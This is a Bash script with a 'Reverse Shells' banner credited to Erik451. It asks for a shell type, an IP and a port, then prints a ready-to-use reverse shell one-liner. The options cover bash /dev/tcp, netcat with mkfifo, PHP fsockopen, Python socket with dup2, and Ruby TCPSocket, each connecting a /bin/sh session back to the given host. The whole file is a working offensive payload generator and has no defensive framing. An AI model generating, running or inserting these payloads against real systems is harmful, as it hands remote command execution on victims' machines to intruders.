#!/bin/bash
#colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Funcion ctrl + c
trap ctrl_c INT
function ctrl_c(){
    echo -e "\n${yellowColour}[]${endColour}${grayColour}Saliendo${endColour}"
    exit 0
}

#Banner
echo -e "${redColour}    ____                                   _____ __         ____"
        sleep 0.05
        echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /____"
        sleep 0.05
        echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / / ___/"
        sleep 0.05
        echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / (__  ) "
        sleep 0.05
        echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/____/  ${endColour}"
        echo -e "\n ${yellowColour} By Erik451 ${endColour}"

#Shell types
echo -e "\n ${purpleColour} Available shell types: ${endColour}"

echo -e "\n 1) bash     4) python"
echo -e "\n 2) netcat   5) ruby"
echo -e "\n 3) php"

#Ask for the type of shell
printf "\n${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter the shell type: ${endColour}"; read shell
printf "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter your ip: ${endColour}"; read ip
printf "${redColour}[${yellowColour}*${redColour}]${turquoiseColour} Enter the port : ${endColour}"; read port

#VARIABLES
bash="bash -i >& /dev/tcp/$ip/$port 0>&1"
netcat="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
php="php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
#Shell type response
case $shell in

    1)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $bash"
         ;;
    2)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $netcat"
         ;;
    3)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $php"
         ;;
    4)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $python"
         ;;
    5)
        echo -e "${blueColour}Use this:${endColour}${yellowColour} $ruby"
         ;;

esac
